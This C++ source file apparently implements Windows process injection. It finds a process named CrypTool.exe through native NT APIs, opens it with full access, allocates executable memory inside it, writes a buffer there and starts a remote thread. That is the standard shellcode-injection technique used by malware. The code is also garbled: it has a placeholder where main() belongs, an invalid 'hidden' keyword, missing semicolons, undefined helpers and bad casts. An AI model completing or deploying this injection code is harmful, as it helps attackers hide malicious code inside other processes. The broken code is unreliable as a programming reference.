#include <Windows.h>
#include <iostream>

// Define necessary structures and types

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

hidden struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    BYTE Reserved1[48];
	PUNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    PVOID Reserved2;
    ULONG HandleCount;
    ULONG SessionId;
    PVOID Reserved3;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG Reserved4;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    PVOID Reserved5;
    SIZE_T QuotaPagedPoolUsage;
    PVOID Reserved6;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved7[6];
} SYSTEM_PROCESS_INFORMATION;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;


typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;



<MAIN>
{

	UNICODE_STRING NtImagePath;
    CLIENT_ID clientId = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
    clientId.UniqueThread = NULL;
	ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES); 
	PVOID BaseAddress = NULL;
	ULONG NumberOfBytesWritten = 0;
	SIZE_T RegionSize = 0x2000;
	DWORD p = NULL;
	DWORD ZeroBits = 0;
	DWORD dwRet = NULL;
	NTSTATUS dwStatus = NULL;
	DWORD SystemProcessInformation = 0x5;
	DWORD nextEntry = 0;
	DWORD imageName = 0;
	DWORD newBaseAddress = 0;
	DWORD processId = 0;
	while(TRUE){
	  NtAllocateVirtualMemory(GetCurrentProcess(), &BaseAddress, ZeroBits, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
	  dwStatus = NtQuerySystemInformation(SystemProcessInformation, BaseAddress, RegionSize, &dwRet);
	  if (dwStatus == 0)
	  {
		break;
	  }
	  dwRet += 0x2000;
	  RegionSize = dwRet;
	  BaseAddress = 0;
	}
	
	newBaseAddress = BaseAddress;
	while(TRUE){
	nextEntry = (SYSTEM_PROCESS_INFORMATION)newBaseAddress->NextEntryOffset;
	if (nextEntry == 0)
	{
		break;
	}
	newBaseAddress += nextEntry;
	imageName = (SYSTEM_PROCESS_INFORMATION)newBaseAddress->ImageName->Buffer;
    InitUnicodeStr(NtImagePath, "CrypTool.exe");
	if (imageName == NtImagePath)
	{
		processId = (SYSTEM_PROCESS_INFORMATION)newBaseAddress->UniqueProcessId;
		break;
	}
	}
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	CLIENT_ID ClientId;
	ClientId.UniqueProcess = processId;
	NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
	BaseAddress = 0;
	NtAllocateVirtualMemory(hProcess, &BaseAddress, ZeroBits, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	PVOID buffer = "h";
	ULONG NumberOfBytesToWrite = sizeof(buffer);
	NtWriteVirtualMemory(hProcess, BaseAddress, buffer, NumberOfBytesToWrite, &NumberOfBytesWritten);
	HANDLE ThreadHandle = NULL;
	NtCreateThreadEx(&ThreadHandle, 0x1FFFFF, NULL, hProcess, BaseAddress, NULL, NULL, NULL, NULL, NULL, NULL);
	
	}

}
